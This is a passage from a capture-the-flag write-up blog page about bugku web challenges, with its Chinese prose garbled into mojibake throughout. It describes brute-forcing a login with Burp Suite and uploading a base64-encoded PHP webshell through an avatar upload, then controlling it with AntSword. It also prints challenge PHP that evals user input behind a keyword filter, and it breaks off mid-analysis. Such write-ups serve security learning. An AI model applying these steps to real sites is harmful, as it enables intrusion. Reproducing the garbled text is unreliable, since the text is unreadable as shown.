<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>æ–°ç‰ˆbugkuå¹³å°Writeup~æŒç»­æ›´æ–°ä¸­ | dota_st</title><meta name="keywords" content="CTF"><meta name="author" content="dota_st"><meta name="copyright" content="dota_st"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="Â¶å‰è¨€ å‰æ®µæ—¥å­ï¼Œæ–°ç‰ˆbugkuå¹³å°æ”¹ç‰ˆä¸Šçº¿ï¼Œç„¶åæˆ‘å°±å…´å†²å†²çš„å»åˆ·äº†ä¸€æ³¢ğŸ˜‚  å¤§éƒ¨åˆ†é¢˜è¿˜æ˜¯ä¸Šçº¿çš„è€bugkuå¹³å°çš„é¢˜ï¼Œä½†ä¹Ÿåœ¨é€æ¸ä¸Šçº¿æ–°é¢˜ï¼Œæ‰€ä»¥å¼€äº†ä¸ªæ–‡ç« è®°å½•ä¸‹æ–°é¢˜çš„åšé¢˜è¿‡ç¨‹ï¼ˆä¼šæ…¢æ…¢æ›´æ–°ï¼‰ã€‚æœ‰å¤§éƒ¨åˆ†webçš„é¢˜æˆ‘åœ¨åšå®¢çš„å¦ä¸€ç¯‡æ–‡ç« å†™è¿‡ï¼Œè¿™é‡Œä¸é‡å¤å†™äº†ï¼Œåªè®°å½•ä¸€äº›æƒ³è®°å½•çš„é¢˜ã€‚ æƒ³çœ‹çš„å¸ˆå‚…ç§»æ­¥åˆ°è¿™é‡Œhttps:&#x2F;&#x2F;www.wlhhlc.top&#x2F;posts&#x2F;55334&#x2F;å™¢ã€‚ Â¶Web Â¶xxxäºŒæ‰‹äº¤æ˜“å¸‚åœº"><meta property="og:type" content="article"><meta property="og:title" content="æ–°ç‰ˆbugkuå¹³å°Writeup~æŒç»­æ›´æ–°ä¸­"><meta property="og:url" content="https://www.wlhhlc.top/posts/49040/index.html"><meta property="og:site_name" content="dota_st"><meta property="og:description" content="Â¶å‰è¨€ å‰æ®µæ—¥å­ï¼Œæ–°ç‰ˆbugkuå¹³å°æ”¹ç‰ˆä¸Šçº¿ï¼Œç„¶åæˆ‘å°±å…´å†²å†²çš„å»åˆ·äº†ä¸€æ³¢ğŸ˜‚  å¤§éƒ¨åˆ†é¢˜è¿˜æ˜¯ä¸Šçº¿çš„è€bugkuå¹³å°çš„é¢˜ï¼Œä½†ä¹Ÿåœ¨é€æ¸ä¸Šçº¿æ–°é¢˜ï¼Œæ‰€ä»¥å¼€äº†ä¸ªæ–‡ç« è®°å½•ä¸‹æ–°é¢˜çš„åšé¢˜è¿‡ç¨‹ï¼ˆä¼šæ…¢æ…¢æ›´æ–°ï¼‰ã€‚æœ‰å¤§éƒ¨åˆ†webçš„é¢˜æˆ‘åœ¨åšå®¢çš„å¦ä¸€ç¯‡æ–‡ç« å†™è¿‡ï¼Œè¿™é‡Œä¸é‡å¤å†™äº†ï¼Œåªè®°å½•ä¸€äº›æƒ³è®°å½•çš„é¢˜ã€‚ æƒ³çœ‹çš„å¸ˆå‚…ç§»æ­¥åˆ°è¿™é‡Œhttps:&#x2F;&#x2F;www.wlhhlc.top&#x2F;posts&#x2F;55334&#x2F;å™¢ã€‚ Â¶Web Â¶xxxäºŒæ‰‹äº¤æ˜“å¸‚åœº"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/9YT534K~N47CEGE%5BCM9A%25C6.png"><meta property="article:published_time" content="2020-12-30T02:08:28.000Z"><meta property="article:modified_time" content="2022-02-13T16:38:15.000Z"><meta property="article:author" content="dota_st"><meta property="article:tag" content="CTF"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/9YT534K~N47CEGE%5BCM9A%25C6.png"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/dota-st/blog_file/E595997D44EF7013BFD08323A4506527.png"><link rel="canonical" href="https://www.wlhhlc.top/posts/49040/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  hexoversion: '5.2.0',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE={isPost:!0,isHome:!1,isHighlightShrink:!1,isSidebar:!0,postUpdate:"2022-02-14 00:38:15"}</script><noscript><style type="text/css">#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(function () {
  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }

  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }
})()</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/dota-st/blog_file/background.min.css"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="/css/tag-diy.css"><meta name="generator" content="Hexo 5.2.0"></head><body><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@master/css/APlayer.min.css"><div id="aplayer"></div><script src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@master/js/APlayer.min.js"></script><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">åŠ è½½ä¸­...</div></div></div><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://blog-file-1302856486.file.myqcloud.com/%E5%A4%B4%E5%83%8F.png" onerror='onerror=null,src="/img/friend_404.gif"' alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length_num">21</div></a></div></div><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length_num">6</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i> <span>å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/tools/"><i class="fa-fw fas fa-tools"></i> <span>å­¦ä¹ &amp;é¡¹ç›®</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i> <span>ç•™è¨€æ¿</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i> <span>å…³äºæˆ‘</span></a></div></div></div></div><div id="body-wrap"><div id="web_bg"></div><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">ç›®å½•</div><div class="sidebar-toc__progress"><span class="progress-notice">ä½ å·²ç»è¯»äº†</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xxx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA"><span class="toc-number">2.1.</span> <span class="toc-text">xxxäºŒæ‰‹äº¤æ˜“å¸‚åœº</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%AC%E8%87%B3%E7%BA%A2%E5%8C%85"><span class="toc-number">2.2.</span> <span class="toc-text">å†¬è‡³çº¢åŒ…</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%85%B0%E5%A5%96"><span class="toc-number">2.3.</span> <span class="toc-text">å®‰æ…°å¥–</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell"><span class="toc-number">2.4.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A0"><span class="toc-number">2.5.</span> <span class="toc-text">ç¤¾å·¥-ä¼ªé€ </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web40"><span class="toc-number">2.6.</span> <span class="toc-text">web40</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sodirty"><span class="toc-number">2.7.</span> <span class="toc-text">sodirty</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86"><span class="toc-number">2.8.</span> <span class="toc-text">ç¤¾å·¥-åˆæ­¥æ”¶é›†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BE%E5%B7%A5-%E8%BF%9B%E9%98%B6%E6%94%B6%E9%9B%86"><span class="toc-number">2.9.</span> <span class="toc-text">ç¤¾å·¥-è¿›é˜¶æ”¶é›†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#No-one-knows-regex-better-than-me"><span class="toc-number">2.10.</span> <span class="toc-text">No one knows regex better than me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%AA%E6%98%8E%E7%9A%84php"><span class="toc-number">2.11.</span> <span class="toc-text">èªæ˜çš„php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Simple-SSTI-1"><span class="toc-number">2.12.</span> <span class="toc-text">Simple_SSTI_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Simple-SSTI-2"><span class="toc-number">2.13.</span> <span class="toc-text">Simple_SSTI_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flask-FileUpload"><span class="toc-number">2.14.</span> <span class="toc-text">Flask_FileUpload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C"><span class="toc-number">3.1.</span> <span class="toc-text">èŠ±ç‚¹æµé‡å¬å¬æ­Œ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%84%E9%94%99%E7%9A%84%E5%AD%97%E7%AC%A6"><span class="toc-number">3.2.</span> <span class="toc-text">æŠ„é”™çš„å­—ç¬¦</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB"><span class="toc-number">3.3.</span> <span class="toc-text">é»„é“åäºŒå®«</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">4.</span> <span class="toc-text">Reverse</span></a></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image:url(https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%60%5DEGP1RJ%5D%7DAC%5D_%5D85OHB%257U.png)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">dota_st</a></span><span id="menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i> <span>æœç´¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i> <span>å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/tools/"><i class="fa-fw fas fa-tools"></i> <span>å­¦ä¹ &amp;é¡¹ç›®</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i> <span>ç•™è¨€æ¿</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i> <span>å…³äºæˆ‘</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">æ–°ç‰ˆbugkuå¹³å°Writeup~æŒç»­æ›´æ–°ä¸­</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2020-12-30T02:08:28.000Z" title="å‘è¡¨äº 2020-12-30 10:08:28">2020-12-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2022-02-13T16:38:15.000Z" title="æ›´æ–°äº 2022-02-14 00:38:15">2022-02-14</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">å­—æ•°æ€»è®¡:</span><span class="word-count">6.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»æ—¶é•¿:</span><span>28åˆ†é’Ÿ</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2><p>å‰æ®µæ—¥å­ï¼Œæ–°ç‰ˆbugkuå¹³å°æ”¹ç‰ˆä¸Šçº¿ï¼Œç„¶åæˆ‘å°±å…´å†²å†²çš„å»åˆ·äº†ä¸€æ³¢ğŸ˜‚<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%60%5DEGP1RJ%5D%7DAC%5D_%5D85OHB%257U.png" alt=""><br> å¤§éƒ¨åˆ†é¢˜è¿˜æ˜¯ä¸Šçº¿çš„è€bugkuå¹³å°çš„é¢˜ï¼Œä½†ä¹Ÿåœ¨é€æ¸ä¸Šçº¿æ–°é¢˜ï¼Œæ‰€ä»¥å¼€äº†ä¸ªæ–‡ç« è®°å½•ä¸‹æ–°é¢˜çš„åšé¢˜è¿‡ç¨‹ï¼ˆä¼šæ…¢æ…¢æ›´æ–°ï¼‰ã€‚æœ‰å¤§éƒ¨åˆ†webçš„é¢˜æˆ‘åœ¨åšå®¢çš„å¦ä¸€ç¯‡æ–‡ç« å†™è¿‡ï¼Œè¿™é‡Œä¸é‡å¤å†™äº†ï¼Œåªè®°å½•ä¸€äº›æƒ³è®°å½•çš„é¢˜ã€‚<br> æƒ³çœ‹çš„å¸ˆå‚…ç§»æ­¥åˆ°è¿™é‡Œ<code>https://www.wlhhlc.top/posts/55334/</code>å™¢ã€‚</p><h2 id="Web"><a class="header-anchor" href="#Web">Â¶</a>Web</h2><h3 id="xxxäºŒæ‰‹äº¤æ˜“å¸‚åœº"><a class="header-anchor" href="#xxxäºŒæ‰‹äº¤æ˜“å¸‚åœº">Â¶</a>xxxäºŒæ‰‹äº¤æ˜“å¸‚åœº</h3><p>é¢˜ç›®æç¤ºæ˜¯ï¼šæœ¬äººç°å®ç¢°åˆ°çš„é¢˜ç›®ï¼Œæ— æç¤ºå‹¿é—®ã€‚å¥½å®¶ä¼™ï¼Œè«éè¦æ¸—é€ä¸€æ³¢ï¼Ÿï¼Ÿ<br> æ‰“å¼€æ˜¯ä¸€ä¸ªè´­ç‰©å¸‚åœºé¡µé¢<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/G28I_WP%25XFU%2905H%60NC600YM.png" alt=""><br> æµè§ˆå®Œä¸€éï¼Œå‘ç°æœ‰æ³¨å†Œå’Œç™»å½•åŠŸèƒ½ã€‚<br> åœ¨ç™»å½•å°è¯•ç”¨adminç™»å½•ï¼Œæç¤ºé™åˆ¶å¾—6ä½ä»¥ä¸Šã€‚å‡†å¤‡é‡‡å–çˆ†ç ´ï¼Œå› ä¸ºéªŒè¯ç æ˜¯åªæ˜¯å‰æ®µéªŒè¯ï¼Œçˆ†ç ´æ˜¯å¯è¡Œçš„(ä¸è¿‡å°±ç®—ä¸æ˜¯å‰æ®µéªŒè¯ï¼Œè®­ç»ƒä¸€æ³¢éªŒè¯ç è¯†åˆ«ä¹Ÿå¯ä»¥å“ˆå“ˆå“ˆ~)<br> ä½†ç”¨æˆ·åå’Œå¯†ç åŒæ—¶çˆ†ç ´å·¥ä½œé‡æœ‰ç‚¹å¤§ï¼Œæ‰€ä»¥æˆ‘ä»¬å»æ³¨å†Œé¡µé¢å»å°è¯•çˆ†ç ´æ³¨å†Œï¼Œçœ‹çœ‹èƒ½å¦çˆ†ç ´å‡ºå·²ç»å­˜åœ¨çš„ç”¨æˆ·å<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/U6CVM4G8VJOZ%5D2CR9KW0LNW.png" alt=""><br> burpsuiteå¯åŠ¨ï¼<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/5LVOQBO085X%25U9~Q6KR8%28QP.png" alt=""><br> çˆ†ç ´å‡ºå­˜åœ¨ç”¨æˆ·å123456ï¼Œæ¥ç€å»ç™»å½•é¡µé¢è¿›è¡Œçˆ†ç ´ï¼Œæ‹¿åˆ°å¯†ç ä¸º123456<br> èŠœæ¹–ï¼Œç™»å½•ï¼âœŒï¸<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/QZX%29EN3X%40%7DDW~6FSXD_OU_5.png" alt=""><br> å‘ç°å¤´åƒæ˜¯å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œç„¶åç†Ÿæ‚‰çš„ä¸€æ¢­å­æ‰“ä¸‹å»ï¼ˆå›¾ç‰‡é©¬ï¼ŒæŠ“åŒ…ï¼‰<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/T0RM~~4R%24AQSD2R6_814M0D.png" alt=""><br> å‘ç°æˆ‘ä»¬ä¼ é€çš„æ•°æ®æ˜¯base64çš„æ•°æ®æµï¼Œæˆ‘ä»¬å»å†™ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åbase64ç¼–ç <br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/XN97XRJKMI%28EO%25H%256YFLQ%7DC.png" alt=""><br> æŠŠæ‹¦æˆªçš„å›¾ç‰‡æ•°æ®æ”¹æˆç»è¿‡base64ç¼–ç åçš„ä¸€å¥è¯æœ¨é©¬ï¼Œå¹¶ä¸”æŠŠå‰é¢çš„jpegæ”¹æˆphpï¼Œgogogoï¼<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/7%7BJU8%7B2U%40VT5DZ44%5BUMU%25UE.png" alt=""><br> ä¸Šä¼ æˆåŠŸï¼Œèšå‰‘å¯åŠ¨ï¼<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/QQ%E6%88%AA%E5%9B%BE20201230103931.png" alt=""><br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/79IMCM%5DG~E%60B5%29%5BERZWUL2B.png" alt=""><br> flagæˆåŠŸæ‹¿åˆ°ï¼Œæ”¶å·¥ã€‚</p><h3 id="å†¬è‡³çº¢åŒ…"><a class="header-anchor" href="#å†¬è‡³çº¢åŒ…">Â¶</a>å†¬è‡³çº¢åŒ…</h3><p>è‡³ä»Šä»ä¸çŸ¥é“é‚£å¤©çš„çº¢åŒ…æœ‰å¤šå¤§<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E5%86%AC%E8%87%B3%E7%BA%A2%E5%8C%85/1%5D%60_N%29%5DP4Q%28M%29%40D4I7B%5B153.png" alt=""><br> æ‰“å¼€é¢˜ç›®ï¼Œä¸€æ®µphpä»£ç ï¼Œè€ƒç»•è¿‡çš„åŠŸåº•äº†<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E5%86%AC%E8%87%B3%E7%BA%A2%E5%8C%85/1NYXWXRZ8%7DG%5B57CFJ%28YMLN8.png" alt=""><br> é¦–å…ˆå®¡è®¡ä¸€ä¸‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$exam</span> = <span class="string">&#x27;return\&#x27;&#x27;</span>.sha1(time()).<span class="string">&#x27;\&#x27;;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;./?flag=&#x27;</span>.<span class="variable">$exam</span>.<span class="string">&#x27;&quot;&gt;Click here&lt;/a&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) != strlen(<span class="variable">$exam</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;é•¿åº¦ä¸å…è®¸&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/`|&quot;|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;å…³é”®å­—ä¸å…è®¸&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) === sha1(<span class="variable">$flag</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;é©¬è€å¸ˆå‘ç”Ÿç”šä¹ˆäº‹äº†&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><blockquote><p>ç¬¬ä¸€ä¸ªifï¼šåˆ¤æ–­æ˜¯å¦ä¼ å‚å˜é‡flagï¼Œæ²¡æœ‰å°±è¾“å‡º$examå’Œä¸€äº›html<br> ç¬¬äºŒä¸ªifï¼šåˆ¤æ–­flagå˜é‡çš„é•¿åº¦æ˜¯å¦å’Œ$examçš„é•¿åº¦ç›¸ç­‰<br> ç¬¬ä¸‰ä¸ªifï¼šè¿‡æ»¤ä¸€äº›å…³é”®å­—ç¬¦<br> 